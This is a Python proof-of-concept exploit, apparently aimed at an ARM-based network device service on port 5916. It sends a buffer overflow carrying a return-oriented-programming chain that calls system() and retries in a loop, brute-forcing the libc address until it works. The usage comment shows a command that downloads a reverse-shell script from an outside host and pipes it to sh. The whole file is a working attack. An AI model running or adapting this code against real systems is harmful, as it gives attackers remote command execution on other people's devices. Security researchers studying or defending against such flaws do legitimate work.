import sys
import struct
import socket

# Example usage: python3 poc.py 192.168.1.16 "curl 192.168.2.1:8000/revshell|sh"
target_ip = sys.argv[1]
cmd_to_exec = sys.argv[2].encode()

print(f"Attempting to execute {cmd_to_exec} on {target_ip}")

PORT = 5916

# Address to guess to keep guessing
libc_base = 0xb6cc0000

def pack(address):
	return struct.pack("<I",address)

def libcAddr(address):
	return pack(libc_base+address)


exploit = b"A" * (512 + 4 + 9)

exploit += libcAddr(0x00016b28) # pop {r3, pc}
exploit += libcAddr(0x00093994) # pop {r7, pc} (so we can deal with our blx r3)

exploit += libcAddr(0x000e7bd4) # mov r0, sp; blx r3;
exploit += pack(0xcafe1337) # Junk for r7, from the pop {r7, pc} we branched to

# sp takes us to just before cmd_to_exec, which has invalid characters, so just increment it a bit
exploit += libcAddr(0x000ed17c) #  add r0, r0, #0x20; pop {r3, r4, r5, pc};
# Junk
exploit += pack(0xdeadbeef) # r3
exploit += pack(0xdeadbeef) # r4
exploit += pack(0xdeadbeef) # r5

# Finally, let's run system()
exploit += libcAddr(0x000351ac) # system()

# We incremented $sp by 0x20 (32), so we're going to space our command out
exploit += b" " * 8
exploit += cmd_to_exec
exploit += b";#" # To prevent ugly bytes breaking the command

command = b"acsinit&ifname=" + exploit + b"\x00"

# Keep trying the payload over and over
# If the address is wrong, the process will crash.
# When it restarts, we try again until the address matches
i = 0
while True:
	try:
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
			sock.connect((target_ip, PORT))
			sock.sendall(command)
				
		print(f"Attempt {i}")
		i += 1
	except ConnectionError:
		pass
	except KeyboardInterrupt:
		sys.exit(0)
